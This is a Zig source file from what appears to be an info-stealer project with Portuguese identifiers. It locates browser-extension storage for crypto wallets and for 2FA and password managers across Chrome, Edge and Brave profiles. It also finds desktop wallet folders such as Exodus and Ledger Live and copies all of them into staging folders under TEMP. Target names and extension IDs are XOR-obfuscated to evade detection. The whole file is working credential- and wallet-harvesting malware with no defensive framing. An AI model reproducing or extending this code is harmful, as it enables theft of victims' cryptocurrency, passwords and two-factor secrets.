const std = @import("std");
const coleta = @import("coleta.zig");
const winfs = @import("winfs.zig");
const obf = @import("obf.zig");

fn copyWalletDir(allocator: std.mem.Allocator, src: []const u8, dst: []const u8, wallet_name: []const u8, col: *coleta.Coleta) void {
    winfs.makeDir(dst) catch {};

    var dir_iter = winfs.DirIter.open(src) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);
        if (entry.is_dir) continue;

        const src_file = std.fs.path.join(allocator, &[_][]const u8{ src, entry.name }) catch continue;
        defer allocator.free(src_file);
        const dst_file = std.fs.path.join(allocator, &[_][]const u8{ dst, entry.name }) catch continue;
        defer allocator.free(dst_file);

        winfs.copyFile(src_file, dst_file) catch continue;

        col.wallets_ext.append(allocator, .{
            .carteira = allocator.dupe(u8, wallet_name) catch continue,
            .caminho = allocator.dupe(u8, dst_file) catch continue,
        }) catch continue;
    }
}

pub fn extensions(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const local_app_data = furtivo.getEnvVar(allocator, "LOCALAPPDATA") catch return;
    defer allocator.free(local_app_data);
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    const Wallet = struct {
        name_obf: []const u8,
        id_obf: []const u8,
    };

    const wallets_obf = [_]Wallet{
        .{ .name_obf = &comptime obf.xorStr("MetaMask"), .id_obf = &comptime obf.xorStr("nkbihfbeogaeaoehlefnkodbefgpgknn") },
        .{ .name_obf = &comptime obf.xorStr("Binance"), .id_obf = &comptime obf.xorStr("fhbohgcigdhpghhlcjolnbackjhcflei") },
        .{ .name_obf = &comptime obf.xorStr("Phantom"), .id_obf = &comptime obf.xorStr("bfnaoomepdephakmegednehibbaifoeo") },
        .{ .name_obf = &comptime obf.xorStr("Coinbase"), .id_obf = &comptime obf.xorStr("hnfanknocfeofbddgcijnmhnfnkdnaad") },
        .{ .name_obf = &comptime obf.xorStr("Ronin"), .id_obf = &comptime obf.xorStr("fnjhmkhhmkbjkkabndcnnoggdgneeccl") },
        .{ .name_obf = &comptime obf.xorStr("Trust Wallet"), .id_obf = &comptime obf.xorStr("ibnejdfjmkfknjbeilfpgnfigepkmbb") },
        .{ .name_obf = &comptime obf.xorStr("OKX Wallet"), .id_obf = &comptime obf.xorStr("mcohjncipfmgfjnmkmdfbgjccocgmfoc") },
        .{ .name_obf = &comptime obf.xorStr("Rabby"), .id_obf = &comptime obf.xorStr("accfcabfhfmejdjbcglbebgmoggfpcff") },
        .{ .name_obf = &comptime obf.xorStr("Temple"), .id_obf = &comptime obf.xorStr("eipjkbckfaldobnipbgofdhnbckfegj") },
        .{ .name_obf = &comptime obf.xorStr("Solflare"), .id_obf = &comptime obf.xorStr("solflare-gbgbhfhcddoaopdcdkbdnmfjlhajdohk.bfgddmepdjobhcbh") },
        .{ .name_obf = &comptime obf.xorStr("Backpack"), .id_obf = &comptime obf.xorStr("ybcudlbdhhakbepdhncgikakclkjledh") },
        .{ .name_obf = &comptime obf.xorStr("Frame"), .id_obf = &comptime obf.xorStr("nphplpgoakhhkjaopnbpknpfhpkgfcdk") },
        // 2FA / Password manager extensions
        .{ .name_obf = &comptime obf.xorStr("Authenticator"), .id_obf = &comptime obf.xorStr("bhghoamapcdpbbhphclnhpbggbgngijf") },
        .{ .name_obf = &comptime obf.xorStr("Authy"), .id_obf = &comptime obf.xorStr("fbnibhchhmcfhhfbjbdhcbfbcadekidi") },
        .{ .name_obf = &comptime obf.xorStr("Bitwarden"), .id_obf = &comptime obf.xorStr("nngceckbapebfimnlniiiahkandclblb") },
        .{ .name_obf = &comptime obf.xorStr("KeePassXC-Browser"), .id_obf = &comptime obf.xorStr("oboonakemkpcfknhncfbcfgkcadiclbc") },
        .{ .name_obf = &comptime obf.xorStr("1Password"), .id_obf = &comptime obf.xorStr("aeblfdkhhhdcdjpifhhbdiojplfjkcao") },
        .{ .name_obf = &comptime obf.xorStr("Dashlane"), .id_obf = &comptime obf.xorStr("fdjlnlccnhmabfnphmebikglbogcdibo") },
    };

    const browser_paths_obf = [_][]const u8{
        &comptime obf.xorStr("Google\\Chrome\\User Data"),
        &comptime obf.xorStr("Microsoft\\Edge\\User Data"),
        &comptime obf.xorStr("BraveSoftware\\Brave-Browser\\User Data"),
    };

    const profiles_obf = [_][]const u8{
        &comptime obf.xorStr("Default"),
        &comptime obf.xorStr("Profile 1"),
        &comptime obf.xorStr("Profile 2"),
        &comptime obf.xorStr("Profile 3"),
    };

    for (browser_paths_obf) |bp_obf| {
        const bp = obf.dexor(allocator, bp_obf) catch continue;
        defer allocator.free(bp);
        for (wallets_obf) |w| {
            const w_name = obf.dexor(allocator, w.name_obf) catch continue;
            defer allocator.free(w_name);
            const w_id = obf.dexor(allocator, w.id_obf) catch continue;
            defer allocator.free(w_id);
            for (profiles_obf) |profile_obf| {
                const profile = obf.dexor(allocator, profile_obf) catch continue;
                defer allocator.free(profile);
                const src = std.fs.path.join(allocator, &[_][]const u8{ local_app_data, bp, profile, "Local Extension Settings", w_id }) catch continue;
                defer allocator.free(src);

                if (!winfs.pathExists(src)) continue;

                const safe_name = std.fmt.allocPrint(allocator, "{s}_{s}_{s}", .{ bp[0..6], profile, w_name }) catch continue;
                defer allocator.free(safe_name);

                const dst = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_wallets", safe_name }) catch continue;
                defer allocator.free(dst);

                copyWalletDir(allocator, src, dst, w_name, col);
            }
        }
    }
}

fn copyDesktopWallet(allocator: std.mem.Allocator, src: []const u8, dst: []const u8, wallet_name: []const u8, col: *coleta.Coleta) void {
    winfs.makeDir(dst) catch {};

    var dir_iter = winfs.DirIter.open(src) orelse return;
    defer dir_iter.deinit();

    while (dir_iter.next(allocator)) |entry| {
        defer allocator.free(entry.name);
        const src_path = std.fs.path.join(allocator, &[_][]const u8{ src, entry.name }) catch continue;
        defer allocator.free(src_path);

        if (entry.is_dir) {
            const sub_dst = std.fs.path.join(allocator, &[_][]const u8{ dst, entry.name }) catch continue;
            defer allocator.free(sub_dst);
            copyDesktopWallet(allocator, src_path, sub_dst, wallet_name, col);
        } else {
            const dst_path = std.fs.path.join(allocator, &[_][]const u8{ dst, entry.name }) catch continue;
            defer allocator.free(dst_path);
            winfs.copyFile(src_path, dst_path) catch continue;

            col.wallets_desk.append(allocator, .{
                .carteira = allocator.dupe(u8, wallet_name) catch continue,
                .caminho = allocator.dupe(u8, dst_path) catch continue,
            }) catch continue;
        }
    }
}

pub fn desktop(allocator: std.mem.Allocator, col: *coleta.Coleta) void {
    const furtivo = @import("furtivo.zig");
    const app_data = furtivo.getEnvVar(allocator, "APPDATA") catch return;
    defer allocator.free(app_data);
    const local_app_data = furtivo.getEnvVar(allocator, "LOCALAPPDATA") catch return;
    defer allocator.free(local_app_data);
    const temp = furtivo.getEnvVar(allocator, "TEMP") catch return;
    defer allocator.free(temp);

    const DesktopWallet = struct {
        name_obf: []const u8,
        path_obf: []const u8,
        is_local: bool,
    };

    const desktop_wallets_obf = [_]DesktopWallet{
        .{ .name_obf = &comptime obf.xorStr("Exodus"), .path_obf = &comptime obf.xorStr("Exodus"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Electrum"), .path_obf = &comptime obf.xorStr("Electrum"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Atomic"), .path_obf = &comptime obf.xorStr("Atomic"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Coinomi"), .path_obf = &comptime obf.xorStr("Coinomi"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Ledger Live"), .path_obf = &comptime obf.xorStr("Ledger Live"), .is_local = true },
        .{ .name_obf = &comptime obf.xorStr("Trezor Suite"), .path_obf = &comptime obf.xorStr("Trezor Suite"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Wasabi Wallet"), .path_obf = &comptime obf.xorStr("WalletWasabi"), .is_local = false },
        .{ .name_obf = &comptime obf.xorStr("Electrum-LTC"), .path_obf = &comptime obf.xorStr("Electrum-LTC"), .is_local = false },
    };

    for (desktop_wallets_obf) |dw| {
        const dw_name = obf.dexor(allocator, dw.name_obf) catch continue;
        defer allocator.free(dw_name);
        const dw_path = obf.dexor(allocator, dw.path_obf) catch continue;
        defer allocator.free(dw_path);
        const env_base = if (dw.is_local) local_app_data else app_data;
        const src = std.fs.path.join(allocator, &[_][]const u8{ env_base, dw_path }) catch continue;
        defer allocator.free(src);

        if (!winfs.pathExists(src)) continue;

        const dst = std.fs.path.join(allocator, &[_][]const u8{ temp, "pipeta_wallets_desk", dw_name }) catch continue;
        defer allocator.free(dst);

        copyDesktopWallet(allocator, src, dst, dw_name, col);
    }
}
